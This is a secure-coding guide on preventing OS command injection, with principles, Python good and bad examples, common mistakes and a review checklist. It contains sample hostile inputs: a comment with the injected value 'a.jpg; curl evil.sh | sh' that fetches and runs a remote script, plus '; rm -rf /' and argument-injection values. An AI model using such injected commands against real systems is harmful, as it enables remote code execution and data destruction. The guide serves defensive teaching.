---
id: security/14-command-injection
topic: security
slug: command-injection
title: "Command Injection"
type: doc
order: 14
status: ready
tags: [security, command-injection]
related: [security/09-input-validation, security/13-sql-injection, security/15-file-upload-security, security/28-owasp-top10]
when_to_use: "Read before writing or reviewing any code that shells out, spawns a process, or builds a command line from input."
---
# Command Injection

## Purpose

This document defines how to invoke external programs without letting untrusted
input become part of the *command* the operating system runs. Command injection
happens when attacker-controlled data reaches a shell, which then interprets
metacharacters (`;`, `|`, `&&`, `$()`, backticks) as new commands. The fix is to
never involve a shell parser: pass the program and its arguments as a structured
list, so input can only ever be an argument value.

This is the same "data becomes code" bug as [SQL injection](13-sql-injection.md),
targeting the OS shell instead of the database. Argument injection (input that
looks like a flag, e.g. `--output=/etc/passwd`) is a closely related variant.

## Why It Matters

A successful command injection gives the attacker code execution on the host with
the process's privileges — the most severe outcome in application security. From
there they can read secrets, pivot into the network, install persistence, or
destroy data. Because the vulnerable code path often "works" for normal inputs
(a filename, a URL), the bug hides until someone sends `; rm -rf` and the shell
happily runs it.

## Core Principles

- **Avoid the shell entirely.** Prefer language APIs and libraries over shelling
  out. No shell means no shell metacharacters to exploit.
- **Pass arguments as a list, never a string.** When you must run a program, use
  the array/`exec` form so the OS receives one program and N discrete arguments;
  the shell is never asked to re-parse them.
- **Never build a command by concatenating input.** String interpolation into a
  command line is the vulnerability; there is no safe way to escape your way out.
- **Validate the program and constrain arguments.** The executable should be a
  fixed, absolute path from an allowlist — never chosen by input.
- **Guard against argument injection.** Terminate options with `--` and validate
  values so input cannot masquerade as a flag.

## Best Practices

- Use the language's process API in its **argument-array** form
  (`subprocess.run([...], shell=False)`, `execFile`, `ProcessBuilder`) so no shell
  is invoked. This is the single most important control.
- If a shell feature (pipes, globbing) is genuinely required, implement it in code
  (iterate files yourself, wire pipes with process APIs) rather than handing a
  string to `sh -c`.
- Resolve the executable to an absolute path from a small allowlist; do not let
  input pick the binary or rely on a mutable `PATH`.
- Validate every argument against a strict pattern (e.g. filenames match
  `^[\w.-]+$`) and reject anything else, as defense in depth.
- Insert a `--` separator before user-supplied positional arguments so a value
  starting with `-` is treated as data, not an option.
- Run the process with least privilege — a dedicated low-rights user, and ideally a
  container or sandbox — so injection, if it ever occurs, is contained.

## Examples

**Good Example** — no shell, arguments as a list, allowlisted binary

```python
import subprocess

def make_thumbnail(src: str, dest: str):
    # shell=False + list form: `src`/`dest` are passed as literal argv entries.
    # The OS never parses them, so `; rm -rf /` in a filename is just a filename.
    subprocess.run(
        ["/usr/bin/convert", "--", src, "-resize", "200x200", dest],  # -- ends options
        shell=False,
        check=True,
        timeout=30,
    )
```

**Bad Example** — input reaches the shell as command text

```python
import os

def make_thumbnail(src, dest):
    # The whole string is handed to /bin/sh. A src of "a.jpg; curl evil.sh | sh"
    # runs an attacker command with the app's privileges.
    os.system(f"convert {src} -resize 200x200 {dest}")  # shell parses metacharacters
```

## Common Mistakes

- Using `os.system`, `shell=True`, `child_process.exec`, or backticks with any
  interpolated input.
- "Sanitizing" by escaping quotes or stripping `;` — blocklists miss `|`, `\n`,
  `$()`, encoded forms, and shell-specific syntax.
- Passing a user value as an argument the target program treats as a flag
  (argument injection), e.g. a filename `--upload-file=...` to `curl`.
- Letting input choose or influence the executable path.
- Building a command string and then splitting it on spaces — filenames with spaces
  and quotes break the split and reopen the hole.
- Running the worker process as root, turning any injection into full host control.

## Production Tips

- Lint/SAST for `shell=True`, `os.system`, `exec(`, and template-built command
  strings; require review for any process spawn.
- Set timeouts and output-size limits on every spawned process to bound denial of
  service from hostile input.
- Log the argv array (not a reconstructed string) and the exit code; alert on
  non-zero exits and killed processes.

## AI Review Checklist

- Is the process spawned with `shell=False` / `execFile` and an argument array?
- Is any use of a shell (`sh -c`, `shell=True`, `exec`) justified and input-free?
- Is the executable a fixed absolute path from an allowlist?
- Are arguments validated, and is `--` used to prevent argument injection?
- Does the process run with least privilege and a timeout?
- Is input validation present as defense in depth, not the only control?

## Related

- `knowledge/security/09-input-validation.md`
- `knowledge/security/13-sql-injection.md`
- `knowledge/security/15-file-upload-security.md`
- `knowledge/security/28-owasp-top10.md`
